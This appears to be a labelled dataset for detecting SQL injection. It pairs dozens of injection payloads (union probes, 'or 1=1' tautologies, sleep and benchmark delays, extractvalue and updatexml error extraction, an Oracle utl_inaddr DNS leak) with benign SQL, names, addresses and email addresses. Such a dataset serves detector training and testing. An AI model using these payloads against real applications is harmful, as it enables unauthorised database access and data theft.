Payload	Attacker
balitear	0
SELECT * FROM  ( SELECT particles FROM mission ) 	0
SELECT * FROM tales	0
6091960000000000	0
 SELECT * FROM choose ORDER BY finger, entirely	0
1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'	1
-5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --	1
"  SELECT IFNULL ( NULL, ""W3Schools.com"" ) ;"	0
SELECT * FROM soil WHERE among LIKE '%join%'	0
1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
  (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  	1
1'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
SELECT * FROM attention WHERE famous LIKE '%floor%'	0
cracoviano	0
kofoed@serviconlevante.mr	0
INSERT INTO brick ( corner, fur, struck, green, education, fellow )  VALUES  ( 'through', 'age'. cell', 'belong', 'whom', 'story', 'driving' )  	0
steele-kripilani@vendomiatico.se	0
47649	0
"SELECT * FROM dot WHERE either BETWEEN ""power"" AND    ""wore"""	0
7361	0
SELECT wait FROM choose UNION SELECT correct FROM available ORDER BY opposite	0
select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   '%'  =  '	1
"-8819""  )   where 9119  =  9119 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --"	1
SELECT TOP 3 * FROM spin WHERE below = 'form' SELECT * FROM origin	0
1'+  (  select trte where 9173  =  9173 and 2006  =  2006	1
select * from generate_series  (  3086,3086,case when   (  3086  =  3327  )   then 1 else 0 end  )   limit 1--	1
englert	0
" select * from users where id  =  1 or ""]."" or 1  =  1 -- 1"	1
SELECT * FROM rich WHERE seven NOT LIKE 'theory%'	0
1'||  (  select 'uvbb' where 7795  =  7795 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'	1
"1%""   )    )     )   union all select null,null#"	1
SELECT COUNT ( growth ) FROM soil	0
valdebenito garabana	0
ducaux@muchachina.tk	0
3781040000000000	0
gattas	0
lonnie	0
 UPDATE return SET camera = 'pond'WHERE of = 'such'	0
SELECT * FROM television WHERE yesterday NOT LIKE 'other%'	0
SELECT * FROM alike WHERE broke = 'satellites' FETCH FIRST 3 ROWS ONLY	0
26292	0
1'+  (  select basp where 6953  =  6953	1
1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  '	1
FROM  ( SELECT DISTINCT low FROM wish ) 	0
 select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1	1
SELECT * FROM line FETCH FIRST 50 PERCENT ROWS ONLY	0
-2050' union all select 5606#	1
"-5278""   )    )     )   union all select 5264,5264,5264#"	1
yihban	0
1  )   as bhdj where 4472  =  4472	1
c4l6716o	0
SELECT MIN ( sea )  AS hurt FROM silence	0
1pa5364e3a	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262312 )  ORDER BY meta_id ASC	0
"1%""   )    )     )   and sleep  (  5  )   and    (    (     (  ""%""  =  """	1
SELECT DISTINCT activity FROM tax	0
SELECT COUNT ( DISTINCT kitchen )  FROM tired	0
1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
 select * from users where id  =  1 +   (  $+  )   union select null,@@VERSION -- 1	1
SELECT * FROM die WHERE ball = 'edge'	0
SELECT COUNT ( material ) FROM bottom	0
1   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6265  =  6265	1
fady	0
1' and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'wjwn'  =  'wjwn	1
virgen	0
"-3082""  )   where 1082  =  1082 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --"	1
SELECT * FROM tears FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM softly	0
deba	0
1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  -- wvjy	1
1'   )    )    as popm where 6594  =  6594 union all select null,null#	1
SELECT * FROM corn WHERE bite BETWEEN 'at' AND 'share'	0
SELECT * FROM party WHERE announced BETWEEN 'trail' AND 'forest'	0
SELECT * FROM else WHERE dish BETWEEN '1996-07-01' AND '1996-07-31'	0
olmos de esgueva	0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""nwjv""  =  ""nwjv"	1
SELECT * FROM flew WHERE flame NOT LIKE 'of%'	0
"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	1
SELECT * FROM let WHERE read LIKE '%magic%'	0
1  )   as ztrb where 1052  =  1052 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #	1
vlez acejas	0
" select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1"	1
1'   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
 select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'	1
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep"	1
3440	0
SELECT * FROM national WHERE with  BETWEEN 10 AND 20	0
1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524	1
 UPDATE vapor SET alone = 'how'WHERE gate = 'acres'	0
03344221k	0
1'+  (  select xzse where 4530  =  4530	1
SELECT * FROM guard WHERE children NOT LIKE '[seldom]%'	0
SELECT * FROM surface WHERE trap = 'iron'	0
-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#	1
"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --"	1
SELECT COUNT ( DISTINCT end )  FROM doctor	0
"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """	1
SELECT * FROM hold WHERE pass BETWEEN '1996-07-01' AND '1996-07-31'	0
-8410'   )    )     )   or 8571  =  8571--	1
almacelles	0
palacn aucapia	0
SELECT * FROM baby WHERE cast NOT LIKE 'twenty%'	0
1972	0
SELECT waste ( s )  FROM direct SELECT putting ( s ) 	0
54011879j	0
SELECT quietly FROM stage UNION ALL SELECT afraid FROM again ORDER BY plate	0
SELECT * FROM street ORDER BY suddenly	0
velasque9	0
SELECT * FROM simplest WHERE warm BETWEEN call09/01/1996ever AND everyone15/31/1996loud	0
SELECT Count ( * )  AS fur	0
 SELECT Orders.OrderID, Customers.CustomerName FROM Orders INNER JOIN  Customers ON Orders.CustomerID  =  Customers.CustomerID;	0
SELECT * FROM prepare WHERE began NOT LIKE 'flew%'	0
25330	0
scavran@eonon.com.at	0
5449720000000000	0
SELECT * FROM important WHERE news  BETWEEN 10 AND 20	0
"1""  )   as dfmm where 7563  =  7563 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	1
callie	0
1%'   )    )    union all select null,null,null--	1
-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--	1
"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --"	1
SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_parent  =  27990 AND  ( wp_posts.post_mime_type LIKE 'image/%' )  AND wp_posts.post_type  =  'attachment' AND   (  (  wp_posts.post_status  =  'inherit'  )  )   ORDER BY wp_posts.menu_order ASC LIMIT 0, 1	0
SELECT enter ( s )  FROM funny LEFT JOIN	0
6862300000000000	0
-5534 or 1983  =  5721#	1
a' waitfor delay '0:0:10'--	1
4.13841E+015	0
coderch gordo	0
SELECT * FROM zero FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM mirror	0
1'  )   as sagj where 4558  =  4558	1
1' where 6795  =  6795 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
1'+  (  select afst where 7454  =  7454 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'	1
SELECT * FROM ran WHERE Price NOT BETWEEN 10 AND 20	0
1'||  (  select 'xyrk' from dual where 9844  =  9844 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
  SELECT   COALESCE ( NULL, NULL, NULL, 'W3Schools.com', NULL, 'Example.com' ) ;	0
-8071   )    )    or 9160  =  4253	1
-1985%'   )    )     )   union all select 3051,3051,3051--	1
berriz	0
"1%""   )    )     )   and 9198  =  9198--"	1
  UPDATE kitchen SET product =  'wait', City =  'favorite' WHERE bat =  everything	0
1,  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  	1
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""llgb"" like ""llgb"	1
22532	0
SELECT * FROM row WHERE weight BETWEEN 'fire' AND 'progress'	0
"1""  )   where 5005  =  5005 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --"	1
SELECT * FROM compound FETCH FIRST 3 ROWS ONLY	0
SELECT dream ( s )  FROM folks SELECT fewer ( s ) 	0
SELECT * FROM what WHERE by = 'quarter'	0
datario	0
SELECT AVG ( plenty ) FROM serious SELECT SUM ( suggest ) 	0
SELECT * FROM powerful WHERE    NOT distant = 'observe'	0
vargas bentos	0
SELECT * FROM brain WHERE gasoline = 'who'	0
"1%""   )    )     )   union all select null,null,null--"	1
SELECT * FROM breath FETCH FIRST 50 PERCENT ROWS ONLY	0
pont de bar, el	0
select   (  case when   (  4205  =  9574  )   then 4205 else 1/  (  select 0  )   end  )  --	1
calle el pilar s/n,	0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i	1
1'+  (  select nxfp where 5006  =  5006	1
SELECT DISTINCT myself FROM storm	0
6759860000000000	0
SELECT * FROM expression 3	0
4909	0
SELECT * FROM report WHERE machinery = 'entirely'  AND  ( average = 'spend' OR bar = 'tight' ) 	0
lewwis.mall@epbx.pg	0
SELECT * FROM pay ORDER BY upper	0
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31'	0
-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--	1
-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh	1
-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#	1
-6165%'   )    )    union all select 5384#	1
SELECT * FROM stream 3 SELECT * FROM unhappy	0
onofre	0
1'||  (  select 'xhcr' from dual where 9279  =  9279	1
"1""  )   where 2088  =  2088 union all select null,null,null,null--"	1
novallas	0
SELECT * FROM perfectly WHERE canal = 'sum'  AND City = 'belt'	0
 select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'	1
"1"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""mbas""  =  ""mbas"	1
SELECT * FROM sharp WHERE lake BETWEEN '1996-07-01' AND '1996-07-31'	0
1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq	1
select   (  case when   (  4297  =  9086  )   then 4297 else 1/  (  select 0  )   end  )  --	1
SELECT MIN ( wish )  AS wolf FROM ear	0
SELECT COUNT ( value )  FROM tea	0
1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #	1
stacey@mediacar.la	0
   SELECT Employees.blew, COUNT ( Orders.sentID )  AS paperFROM    ( OrdersINNER JOIN man ON Orders.girlID  =  Employees.cowID ) 	0
l655a2uta	0
1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl	1
-8028%'   )    )     )   or 5042  =  5214	1
SELECT * FROM struck WHERE at = 'dance'	0
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'ejdk' like 'ejdk	1
-2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--	1
2145810000000000	0
"1"" where 5250  =  5250"	1
SELECT * FROM anyway WHERE color = 'yet'	0
SELECT CustomerName, ContactName INTO CustomersBackup2017 FROM Customers;	0
   SELECT powder,new,best,such,live     (  (  wrapped JOIN being ON only.tiny =  copy.noise )   INNER JOIN shownON Orders.perfectly =  satisfied.streetID ) 	0
SELECT * FROM variety  WHERE law = cross	0
SELECT * FROM feed WHERE decide = 'promised' FETCH FIRST 3 ROWS ONLY	0
stetson	0
ech5d7	0
 or true--	1
SELECT * FROM pond FETCH FIRST 3 ROWS ONLY	0
martens@ajuntamentbarcelona2-0.tl	0
INSERT INTO amount ( border, slide, north, egg, draw, stock )  VALUES  ( 'atomic', 'heart'. language', 'baseball', 'weak', 'harbor', 'support' )  	0
felipa	0
SELECT * FROM spend WHERE search BETWEEN '1996-07-01' AND '1996-07-31'	0
1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # qmkh	1
1   )    )    as bebl where 2597  =  2597   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --	1
6657410000000000	0
1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'xjvr'  =  'xjvr	1
  SELECT * FROM raise WHERE person NOT IN  ( 'ring', 'another', 'furniture' )  	0
SELECT TOP 3 * FROM chart WHERE can = 'west'	0
SELECT TOP 3 * FROM fewer WHERE spend = 'library'	0
o1e6e2d6	0
-7442  )   or 3391  =  7492	1
  SELECT driverID AS ID, string AS year FROM event	0
"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --"	1
SELECT * FROM simple	0
oke	0
SELECT * FROM single	0
SELECT * FROM facing ORDER BY putting DESC	0
31243	0
SELECT vapor ( s )  FROM very SELECT see ( s ) 	0
1' where 2134  =  2134 rlike   (  select   (  case when   (  3613  =  2090  )   then 1 else 0x28 end   )    )   --	1
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 	1
   SELECT can, egg, porch FROM fully WHERE bread  IS NULL	0
valdemaluque	0
SELECT composed ( s )  FROM how FULL OUTER JOIN	0
DELETE FROM stomach WHERE memory = 'later'	0
c/ valladolid 194, 6?b	0
1' and 9970  =  3409	1
SELECT * FROM put WHERE storm = 'silver' LIMIT 3	0
pilocarpina	0
9.32767E+015	0
1'   )    )    as jmnw where 6496  =  6496 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
calle ecuador 143	0
   SELECT Employees.brass, COUNT ( Orders.importantID )  AS powderFROM    ( OrdersINNER JOIN lonely ON Orders.wayID  =  Employees.definitionID ) 	0
1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln	1
3m6noja4	0
waitfor delay '0:0:5'-- thuo	1
"1""  )   where 6128  =  6128 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --"	1
SELECT AVG ( writing ) FROM tales SELECT SUM ( shake ) 	0
SELECT * FROM solve WHERE combination BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT * FROM coming  WHERE dot NOT LIKE '[raise]%'	0
1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'	1
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo"	1
gail	0
"1"" where 1452  =  1452 union all select null,null,null,null--"	1
1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#	1
INSERT INTO stay  ( caught, mainly, find )  VALUES  ( 'model', 'mean', 'giving' )  	0
SELECT * FROM noun FETCH FIRST 50 PERCENT ROWS ONLY	0
masapati	0
07485924e	0
-4093'   )    )    union all select 5785,5785,5785#	1
"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--"	1
cardenal mendoza s/n, 7?h	0
mediona	0
1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'vpus'  =  'vpus	1
SELECT AVG ( struggle )  FROM wave  SELECT SUM ( each ) 	0
   SELECT thick, doctor+ ', ' + creature+ ' ' + these+ ', ' + balance AS list  FROM wool	0
carrer de merida 35 8-c	0
alcoholado sabaters	0
"1""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --"	1
abi	0
select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'xmwj'  =  'xmwj	1
INSERT INTO cool  ( mile, thank, leaf )  VALUES  ( 'row', 'tribe', 'rope' )  	0
.raijo	0
1,row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  	1
SELECT * FROM doubt	0
canal saracho	0
SELECT * FROM careful FETCH FIRST 50 PERCENT ROWS ONLY	0
1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'iari'  =  'iari	1
SELECT AVG ( told )  FROM welcome  SELECT SUM ( yesterday ) 	0
1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   	1
saviange_files@zytel.nc	0
SELECT * FROM correctly WHERE NOT including = 'know'  AND NOT breathing = 'block'	0
42552726n	0
13440	0
vir7eino	0
SELECT COUNT ( divideID ) FROM asleep	0
SELECT * FROM strip	0
SELECT * FROM near WHERE bill NOT BETWEEN 'further' AND 'nice'	0
"SELECT NULLIF ( ""Hello"", ""world"" ) ;"	0
SELECT * FROM rush ORDER BY important	0
57418420r	0
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm	1
SELECT DISTINCT river FROM she	0
1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb	1
"-9504%""   )    )    or 8098  =  7472"	1
 SELECT * FROM structure ORDER BY sand, each	0
SELECT just	0
deying	0
SELECT * FROM express FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT TOP 50 PERCENT * FROM floor SELECT * FROM sort FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM snake	0
marsh@comerciosaspe.ke	0
-8309'||  (  select 'qecl' where 8449  =  8449 union all select 8449,8449,8449,8449,8449,8449,8449--	1
SELECT Count ( * )  AS silk	0
  SELECT occur,clothes FROM oil WHERE remain = 'quarter' UNION SELECT plane, zipper FROM zoo	0
SELECT AVG ( across )  FROM day  SELECT SUM ( modern ) 	0
c/ aulencia, 84	0
"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --"	1
fantaseadora	0
"1%""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """	1
techumbre	0
mcavoy-zabczynski@discotecateatre.gt	0
SELECT AVG ( vowel ) FROM trade SELECT SUM ( plates ) 	0
 UPDATE moment SET sell = 'lay'WHERE trick = 'managed'	0
   SELECT judge, cowboy, case FROM grow WHERE himself  IS NULL	0
SELECT * FROM shake ORDER BY jar DESC	0
SELECT COUNT ( design )  FROM begun	0
SELECT * FROM thousand WHERE exciting = 'courage' LIMIT 3	0
69320452q	0
"-2059%"" or elt  (  4587  =  3101,3101  )   and ""%""  =  """	1
salerno.harmer@nexuspark.li	0
SELECT * FROM anyway WHERE doctor = 'strike' FETCH FIRST 3 ROWS ONLY	0
ilijev@mauroman.tc	0
29450	0
%27 or 1  =  1	1
6733670000000000	0
pompa	0
SELECT TOP 50 PERCENT * FROM take SELECT * FROM result FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM law	0
SELECT TOP 3 * FROM split	0
SELECT * FROM laugh	0
SELECT poetry	0
1   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   7594  =  7594	1
1' union all select null#	1
  SELECT * FROM position WHERE broke IN  ( 'valuable', 'dinner', 'record' )  	0
5718	0
1'||  (  select 'hbho' from dual where 7193  =  7193	1
"1""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""onhh""  =  ""onhh"	1
SELECT * FROM clothes WHERE Price NOT BETWEEN 10 AND 20	0
SELECT TOP 50 PERCENT * FROM brother	0
SELECT AVG ( storm ) FROM zulu SELECT SUM ( origin ) 	0
1'  )   where 9317  =  9317 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --	1
-5137  )   or 9323  =  9323#	1
  SELECT will,suit,green FROM damage LEFT JOIN Orders ON rod.pineID =  outer.ask ORDER BY pipe.brought	0
1  )   where 5096  =  5096 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
SELECT column1 , column2, ... FROM table_name WHERE condition1 OR condition2 OR condition3 ... ;	0
   SELECT local, needed, ratherFROM law WHERE doctor  IS NOT NULL	0
SELECT * FROM divide WHERE went = 'selection' LIMIT 3	0
1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # hkrp	1
oesterlein@connect.pw	0
SELECT * FROM carbon WHERE indicate = 'paragraph' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM rubber FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT * FROM running WHERE    NOT rocky = 'involved'	0
calle valdibaez 185,	0
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf	1
01062744y	0
"  SELECT REPLACE ( ""SQL Tutorial"", ""SQL"", ""HTML"" ) ;"	0
"1""  )   where 6072  =  6072 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #"	1
SELECT AVG ( muscle ) FROM dangerous	0
c/ observatorio meteorologico retiro 70, 3?a	0
SELECT AVG ( customs ) FROM sit SELECT SUM ( red ) 	0
d37t30	0
4ode5ista	0
SELECT COUNT ( he )  FROM clothing	0
SELECT announced ( s )  FROM terrible LEFT JOIN	0
1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '	1
SELECT stuck ( s )  FROM development SELECT though FROM upon	0
SELECT number FROM may	0
1  )   order by 1--	1
1'  )   and make_set  (  8403  =  8403,8899  )  	1
SELECT * FROM thread FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM president	0
ch9let_a	0
SELECT MIN ( whether )  AS around FROM start	0
SELECT AVG ( horn ) FROM until SELECT SUM ( typical ) 	0
83236273d	0
SELECT * FROM everyone 3	0
SELECT complete	0
1'   )    )    union all select null,null,null,null,null,null,null--	1
-9024  )   where 1686  =  1686 or 3069  =  8213--	1
8537	0
SELECT * FROM save WHERE spread BETWEEN potatoes09/01/1996we AND salmon15/31/1996baseball	0
SELECT * FROM sure WHERE Price NOT BETWEEN 10 AND 20	0
-8026 or elt  (  8434  =  4516,4516  )  # bsqo	1
lapa, la	0
1' where 2391  =  2391 union all select null,null,null,null,null,null,null,null,null,null--	1
1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595#	1
